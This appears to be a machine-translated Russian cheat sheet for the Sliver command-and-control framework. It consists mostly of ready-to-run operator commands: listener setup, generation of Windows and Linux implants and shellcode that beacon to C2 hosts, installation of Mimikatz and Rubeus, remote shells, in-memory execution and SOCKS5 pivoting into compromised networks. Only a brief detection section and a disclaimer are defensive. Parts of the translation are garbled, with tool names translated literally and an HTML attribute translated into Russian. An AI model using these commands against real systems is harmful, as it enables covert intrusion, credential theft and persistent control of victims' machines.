<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ⚔️ Щепка C2 — Полная шпаргалка

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗██╗     ██╗██╗   ██╗███████╗██████╗      ██████╗██████╗ 
  ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗    ██╔════╝╚════██╗
  ███████╗██║     ██║██║   ██║█████╗  ██████╔╝    ██║      █████╔╝
  ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██║     ██╔═══╝ 
  ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║    ╚██████╗███████╗
  ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝
       Modern Open-Source Command & Control (C2) Framework by Bishop Fox
```
<p выравнивание="центр">
  <img src="https://img.shields.io/badge/Sliver-C2_Framework-blue?style=for-the-badge" alt="Sliver">
  <img src="https://img.shields.io/badge/Author-Bishop_Fox-orange?style=for-the-badge" alt="Епископ Фокс">
  <img src="https://img.shields.io/badge/Language-Go-cyan?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Category-C2_&_Red_Team-red?style=for-the-badge" alt="Красная команда">
</p>

<p выравнивание="центр">
  <b>⚔️ Современная кроссплатформенная система эмуляции противника с открытым исходным кодом и платформа управления и контроля, поддерживающая протоколы mTLS, WireGuard, HTTP(S) и DNS</b>
</p>

---

## 📋 Содержание

- [Обзор и архитектура](#-обзор--архитектура)
- [Установка и настройка сервера](#-installation--server-setup)
  - [Автоматическая установка One-Liner](#automated-one-liner-install)
  - [Конфигурация многопользовательского оператора](#multiplayer-operator-configuration)
- [Конфигурация прослушивателя (mTLS, HTTP, WireGuard, DNS)](#-listener-configuration-mtls-http-wireguard-dns)
- [Генерация имплантатов (маяки против сеансов)](#-generating-implants-beacons-vs-sessions)
  - [Интерактивные сеансы против асинхронных маяков](#interactive-sessions-vs-asynchronous-beacons)
  - [Windows EXE и имплантаты шеллкода](#windows-exe--shellcode-implants)
  - [Имплантаты ELF для Linux и macOS](#linux--macos-elf-implants)
- [Экосистема после эксплуатации и арсенала](#-post-exploitation--armory-ecosystem)
  - [Установка расширений Armory (BOF, пончик, ремень безопасности)](#installing-armory-extensions-bofs-donut-seatbelt)
  - [Доступ к учетным данным и Mimikatz](#credential-access--mimikatz)
  - [Поворот и динамические SOCKS5](#pivoting--dynamic-socks5)
- [Краткая справочная таблица](#-краткая справочная-таблица)
- [Защитные соображения и обнаружение](#-защитные-соображения--обнаружение)
- [Юридическая оговорка](#-юридическая оговорка)

---

## 🎯 Обзор и архитектура

**Sliver**, разработанный в Go **Bishop Fox**, является одной из лучших альтернатив с открытым исходным кодом коммерческим платформам C2 (Cobalt Strike, Brute Racel):
- **Кроссплатформенность:** Серверы и имплантаты поддерживают Windows, Linux и macOS в `x86_64`, `arm64` и `arm`.
- **Ускользающая связь:** Готовая поддержка взаимного TLS (mTLS), UDP-туннелей WireGuard, HTTP/HTTPS с процедурной канареечной генерацией и туннелирования DNS.
- **Выполнение в памяти:** встроенная отражающая DLL-инъекция, файлы маяковых объектов (BOF), встроенное выполнение .NET через Donut и очистка процессов.
- **Многопользовательская архитектура:** Совместная работа нескольких операторов красной команды в режиме реального времени с помощью профилей операторов с криптографической подписью.

---

## 📥 Установка и настройка сервера

### Автоматическая установка в одну строку
```bash
# Download and install sliver-server and sliver-client
curl -s https://sliver.sh/install | sudo bash

# Start the Sliver background daemon
sudo systemctl enable --now sliver
```
### Конфигурация оператора многопользовательской игры
Создайте профиль оператора на сервере C2 для участника команды:
```bash
# On the C2 server
sliver-server operator --name alice --lhost 192.168.1.100 --save /tmp/alice.sliver

# On the operator's laptop
sliver-client import /path/to/alice.sliver
sliver-client
```
---

## 🎧 Конфигурация прослушивателя (mTLS, HTTP, WireGuard, DNS)

Внутри консоли `sliver`:
```text
# Start mutual TLS listener on port 8888
[sliver] > mtls --lport 8888

# Start HTTPS listener on port 443 with automated Let's Encrypt certificates
[sliver] > https --lport 443 --domain c2.example.com

# Start lightweight WireGuard listener on port 53/UDP
[sliver] > wg --lport 53

# Verify running listeners
[sliver] > jobs
```
---

## 🚀 Генерация имплантатов (маяки против сеансов)

### Интерактивные сеансы против асинхронных маяков
- **Сеанс:** TCP/TLS-соединение в реальном времени с мгновенным ответом на команду. Более высокая видимость сети.
- **Маяк**: асинхронное сердцебиение, которое засыпает на определенные интервалы со случайным джиттером. SOC значительно сложнее выявить с помощью анализа сетевых аномалий.

### Windows EXE и имплантация шеллкода
```text
# Generate a Windows x64 interactive mTLS session implant
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 --format exe --save /tmp/payload.exe

# Generate a stealthy HTTP beacon implant with 60s sleep and 20% jitter
[sliver] > generate beacon --http https://c2.example.com:443 --seconds 60 --jitter 20 --os windows --format exe

# Generate raw x64 position-independent shellcode
[sliver] > generate --mtls 192.168.1.100:8888 --os windows --format shellcode --save /tmp/shellcode.bin
```
### Имплантаты ELF для Linux и macOS
```text
# Linux x64 ELF binary
[sliver] > generate --mtls 192.168.1.100:8888 --os linux --arch amd64 --format elf --save /tmp/agent.elf
```
---

## 🛠️ Экосистема после эксплуатации и арсенала

### Установка расширений Armory (BOF, пончик, ремень безопасности)
The Armory — это интегрированный менеджер пакетов Sliver для сторонних наступательных инструментов и объектных файлов Cobalt Strike Beacon (BOF):
```text
# Update package list
[sliver] > armory update

# Install popular extensions
[sliver] > armory install bof-roast
[sliver] > armory install seatbelt
[sliver] > armory install rubeus
[sliver] > armory install mimikatz
```
### Взаимодействие с сессиями и маяками
```text
# List active sessions
[sliver] > sessions

# Interact with a specific session
[sliver] > use <SESSION_ID>

# Take a screenshot
[sliver] (session) > screenshot

# Spawn an interactive shell
[sliver] (session) > shell

# Execute .NET assembly in-memory without touching disk
[sliver] (session) > execute-assembly /opt/Seatbelt.exe -group=system
```
### Поворот и динамический SOCKS5
Направьте внешние атакующие инструменты непосредственно в скомпрометированную целевую сеть:
```text
# Start SOCKS5 proxy on local port 1080 of the C2 client
[sliver] (session) > socks5 start --port 1080

# Check active pivots
[sliver] > pivots
```
---

## ⚡ Краткая справочная таблица

| Цель | Команда |
|-----------|---------|
| **Запустить прослушиватель mTLS** | `mtls --lport 8888` |
| **Запустить прослушиватель HTTPS** | `https --lport 443 --domain c2.domain.com` |
| **Создать EXE-файл сеанса** | `generate --mtls <IP>:8888 --os windows -f exe` |
| **Создать EXE-файл маяка** | `generate beacon --http <URL> --seconds 60 -f exe` |
| **Сгенерировать необработанный шеллкод** | `generate --mtls <IP>:8888 -f shellcode` |
| **Список сеансов и взаимодействие с ними**| `sessions` -> `use <ID>` |
| **Установить инструменты Armory** | `armory install seatbelt mimikatz` |
| **Выполнение .NET в памяти**| `execute-assembly /path/to/binary.exe <args>` |
| **Обратный прокси-сервер SOCKS5** | `socks5 start --port 1080` |

---

## 🛡️ Соображения по защите и обнаружению

1. **Отпечаток JARM:** HTTP-прослушиватели Sliver по умолчанию можно профилировать с помощью активного снятия отпечатков JARM TLS. Настройте шифры TLS в конфигурации Sliver.
2. **YARA и бинарный анализ:** Имплантаты по умолчанию, созданные `generate`, содержат метаданные Golang и структуры символов, если они не скрыты с помощью искажения (`--skip-symbols`).

---

## ⚠️ Юридическая оговорка

> [!ВНИМАНИЕ]
> Sliver — это продвинутая система моделирования противника и система управления и контроля красной команды. Его необходимо использовать исключительно в санкционированных боевых действиях с четкими правилами ведения боевых действий (RoE). Несанкционированное использование на сторонних компьютерах строго незаконно.